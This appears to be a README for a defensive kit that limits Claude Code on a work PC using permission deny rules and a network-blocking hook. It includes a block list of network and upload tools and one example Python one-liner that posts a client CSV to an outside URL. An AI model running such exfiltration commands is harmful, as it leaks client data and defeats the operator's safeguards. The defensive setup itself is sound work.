# Work-PC Security Kit for Claude Code

Purpose: make sure Claude Code on the work computer cannot leak client data or
damage the machine, without me having to manually inspect every command. This is
the deterministic safety layer we decided on instead of a "guardian agent" (an
agent is still an LLM and can be wrong; deny rules and hooks cannot be reasoned
around).

## The threat this actually addresses

The real risk on the work PC is **not** "code that attacks the computer." Pure
local file-processing scripts (like the CapEx extraction scripts) can only read
the files you point them at and write output beside them. The real risk is:

1. **Data exfiltration** - client data (company names, tax IDs, costs) leaving
   the machine via a network call, an upload, or a `git push`.
2. **Destructive file operations** - an accidental delete or overwrite.

This kit blocks both at the harness level, so it does not depend on Claude (or me)
making the right call in the moment.

## What's in here

| File | What it does |
|------|--------------|
| `settings.json` | Permission rules: hard-denies network/upload/push commands and the web tools; forces a prompt before deletes and before running Python. |
| `block-network.ps1` | A PreToolUse hook that scans the full text of every Bash command and blocks anything containing a network indicator, even when hidden inside a Python one-liner. Closes the one gap the deny rules can't see. |

## How the two layers fit together

- **Deny rules** catch network/exfiltration tools called by name: `curl`, `wget`,
  `Invoke-WebRequest`, `scp`, `ssh`, `git push`, etc., plus the built-in `WebFetch`
  and `WebSearch` tools. A deny rule is a hard block with no "allow once" button.
- **The hook** catches the case the deny rules can't: a network call buried inside
  a script, e.g. `python -c "import requests; requests.post(url, data=open('clients.csv').read())"`.
  The deny rule sees `python` and would only prompt; the hook reads the whole
  command string, spots `requests.` / `http://`, and blocks it outright.
- **Ask rules + default prompting** handle everything destructive or arbitrary:
  `rm` / `Remove-Item` / `del` and any `python` run will always prompt first, so
  nothing executes without you seeing it.

## Install on the work PC

1. Copy this whole folder's two operational files onto the work machine:
   - `block-network.ps1` -> `C:\Users\YOUR_USER\.claude\block-network.ps1`
   - Merge `settings.json` into `C:\Users\YOUR_USER\.claude\settings.json`
     (user-level, applies to every project). If that file already exists, paste
     the `permissions` and `hooks` blocks into it rather than overwriting.
2. In the copied `settings.json`, fix the hook path: replace `YOUR_USER` with the
   real Windows username so it points at where you put `block-network.ps1`.
3. Restart Claude Code so it reloads settings.
4. Verify it works (see below).

## Verify it's live

After restart, ask Claude Code to run each of these. All three must be blocked:

- `curl https://example.com` -> blocked by deny rule
- `python -c "import requests; requests.get('http://example.com')"` -> blocked by the hook
- `git push` -> blocked by deny rule

And this must still prompt (not silently run): `Remove-Item somefile.txt`.

If any network command goes through, the hook path in `settings.json` is wrong or
Claude Code wasn't restarted.

## Important: never bypass

Do **not** launch Claude Code with `--dangerously-skip-permissions` on the work
machine. That flag ignores the deny rules and the prompts. The whole point of this
kit is that the safety does not depend on judgment in the moment, and that flag
throws it away.

## What this does NOT cover (be honest about the edges)

- It does not stop the connected MCP integrations (Gmail, Notion) from sending
  data out, because those aren't Bash commands. If the work PC has any MCP servers
  connected that can send/upload, treat those as a separate review. Simplest rule:
  don't connect outbound integrations on the work machine.
- It does not encrypt or classify files. It prevents data from leaving; it doesn't
  track what's sensitive.
- A determined user can always run anything manually in a normal terminal. This
  governs Claude Code, not the whole computer.

## Keep client output out of git

Separate from this kit, but the most important habit: the extraction scripts write
CSVs containing company names and tax IDs. Make sure those output files live only
in the SharePoint/work folder and are never committed. The `git push` deny rule is
the backstop, but the first line of defense is just not putting client data in a
repo.
